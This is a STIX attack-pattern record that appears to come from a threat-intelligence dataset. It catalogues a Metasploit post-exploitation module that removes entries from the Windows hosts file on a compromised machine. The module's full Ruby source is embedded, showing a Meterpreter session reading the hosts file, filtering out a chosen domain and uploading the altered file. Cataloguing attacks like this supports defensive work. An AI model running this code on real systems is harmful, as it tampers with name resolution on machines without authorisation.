{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5867b36-610f-4294-b5e2-7df51a62bd8f",
    "created": "2024-08-14T16:33:04.986398Z",
    "modified": "2024-08-14T16:33:04.986401Z",
    "name": "Windows Manage Host File Entry Removal",
    "description": " This module allows the attacker to remove an entry from the Windows hosts file.  'License' => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/remove_host.rb",
            "external_id": "remove_host.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Host File Entry Removal',\n        'Description' => %q{\n          This module allows the attacker to remove an entry from the Windows hosts file.\n        },\n        'License' => BSD_LICENSE,\n        'Author' => [ 'vt <nick.freeman[at]security-assessment.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_tell\n              core_channel_write\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DOMAIN', [ true, 'Domain name to remove from the hosts file.' ])\n      ]\n    )\n  end\n\n  def run\n    hosttoremove = datastore['DOMAIN']\n    # remove hostname from hosts file\n    fd = client.fs.file.new('C:\\\\WINDOWS\\\\System32\\\\drivers\\\\etc\\\\hosts', 'r+b')\n\n    # Get a temporary file path\n    meterp_temp = Tempfile.new('meterp')\n    meterp_temp.binmode\n    temp_path = meterp_temp.path\n\n    print_status(\"Removing hosts file entry pointing to #{hosttoremove}\")\n\n    newfile = ''\n    fdray = fd.read.split(\"\\r\\n\")\n\n    fdray.each do |line|\n      unless line.match(\"\\t#{hosttoremove}$\")\n        newfile += \"#{line}\\r\\n\"\n      end\n    end\n\n    fd.close\n\n    meterp_temp.write(newfile)\n    meterp_temp.close\n\n    client.fs.file.upload_file('C:\\\\WINDOWS\\\\System32\\\\drivers\\\\etc\\\\hosts', meterp_temp)\n    print_good('Done!')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}